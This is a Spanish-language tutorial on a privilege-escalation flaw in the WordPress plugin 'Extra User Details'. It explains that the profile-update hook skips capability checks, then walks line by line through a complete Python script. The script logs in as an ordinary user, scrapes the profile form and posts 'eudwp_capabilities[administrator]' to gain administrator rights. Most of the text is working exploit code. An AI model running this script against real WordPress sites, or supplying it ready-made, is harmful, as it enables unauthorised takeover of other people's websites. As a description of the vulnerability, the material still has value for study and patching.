# Escalación de privilegios en WordPress

Existe un plugin (Extra User Details) que te permite añadir campos extra a la página de perfil del usuario (por ejemplo, enlaces a Facebook, Twitter, LinkedIn, etc.).
El plugin guarda los datos de los campos en la tabla wp_usermeta. Puedes agregar y editar campos adicionales en los ajustes del plugin desde el administrador de WordPress.

Este plugin sufre de una vulnerabilidad de escalación de privilegios.
El plugin usa un hook `eud_update_ExtraFields` para ejecutar la función `profile_update` de WordPress. Esta función no comprueba correctamente las capacidades o permisos del usuario, y actualiza toda los metadatos o información que se envía a los datos del post, en este caso el usuario.

La única condición es que el nombre de la variable del post tenga el prefijo `eud` que es eliminado antes de actualizar los valores en la base de datos.
Es por eso que es posible explotar este mal comportamiento para actualizar la variable de las capacidades de un usuario. Por ejemplo, {prefijo}_capabilities para obtener privilegios administrativos.

Para este exploit, se asume que en la base de datos del sitio de WordPress se usa el prefijo `wp_`, que es el prefijo por defecto de las tablas de WordPress.


Primero importamos dos bibliotecas que serán necesarias para el procedimiento.
"request" que nos servirá para realizar solicitudes HTTP, y "BeautifulSoup" que nos servirá para analizar el contenido HTML.

Definimos algunas variables, como la URL base del sitio web, la URL de inicio de sesión y la URL del perfil. En este caso, usaremos "http://example.com" como URL base de ejemplo.
`baseUrl = 'http://example.com'`
`loginUrl = baseUrl + '/wp-login.php'`
`profileUrl = baseUrl + '/wp-admin/profile.php'`

Creamos un diccionario "loginPostData" que contiene los datos necesarios para iniciar sesión en el sitio web.
Aquí se definen valores para el nombre de usuario ("log"), contraseña ("pwd"), opción para recordar sesión ("rememberme") y el botón de envío ("wp-submit").
loginPostData = {
    'log': 'username',
    'pwd': 'password',
    'rememberme': 'forever',
    'wp-submit': 'Log+In'
}

Creamos una sesión de requests utilizando "requests.Session()". La sesión la utilizamos para mantener la información de la sesión, como las cookies, entre diferentes solicitudes.
s = requests.Session()

Después, enviamos una solicitud de tipo POST para iniciar sesión en el sitio web utilizando la URL de inicio de sesión ("loginUrl") y los datos de inicio de sesión ("loginPostData"). Guardamos la respuesta en la variable "r".
r = s.post(loginUrl, loginPostData)

Verificamos el código de estado de la respuesta ("r.status_code") para asegurarnos de que la solicitud de inicio de sesión fue exitosa. Si el código de estado no es 200, se imprime "Login error" y se sale del programa con "exit(1)".
if r.status_code != 200:
    print('Login error')
    exit(1)

Realizamos una solicitud "GET" a la URL del perfil ("profileUrl") para obtener la página del perfil del usuario autenticado. Guardamos el contenido de la respuesta en la variable "r" y luego creamos un objeto "BeautifulSoup" llamado "soup" para analizar el HTML.
r = s.get(profileUrl)
soup = BeautifulSoup(r.text, 'html.parser')

Utilizando soup, buscamos un formulario con el atributo "id" igual a "your-profile" y lo guardamos en la variable "f". Si no se encuentra un formulario, se imprime "Error" y se sale del programa.
f = soup.find('form', {'id': 'your-profile'})
if not f:
    print('Error')
    exit(1)

Creamos un nuevo diccionario "data" para almacenar los datos que queremos enviar al servidor para actualizar el perfil. En este caso, establecemos el rol del usuario como administrador ("eudwp_capabilities[administrator]").
data = {
    'eudwp_capabilities[administrator]': 1,
}

Recorremos todos los elementos "<input>" dentro del formulario. Si tienen un atributo "name", "value" y el valor de "value" no está vacío, agregamos esa información al diccionario "data" utilizando el nombre como clave y el valor como valor.
for i in f.find_all('input'):
    if 'name' in i.attrs and 'value' in i.attrs and i.attrs['value']:
        data[i.attrs['name']] = i.attrs['value']

Luego, enviamos una solicitud de tipo "POST" a la URL del perfil ("profileUrl") utilizando la sesión "s" y los datos actualizados ("data"). Guardamos la respuesta en la variable "r".
r = s.post(profileUrl, data)

Verificamos el estado de la respuesta ("r.status_code"). Si es igual a 200, se imprime "Success", lo que nos indica que la actualización del perfil fue exitosa.
if r.status_code == 200:
    print('Success')

Finalmente, utilizamos "exit(0)" para salir del programa, indicando que el programa se ha ejecutado correctamente.
exit(0)

En resumen, lo que hacemos es iniciar sesión en un sitio web de WordPress utilizando solicitudes HTTP, analizando y modificando el perfil del usuario utilizando "BeautifulSoup" y modificando la base de datos. 
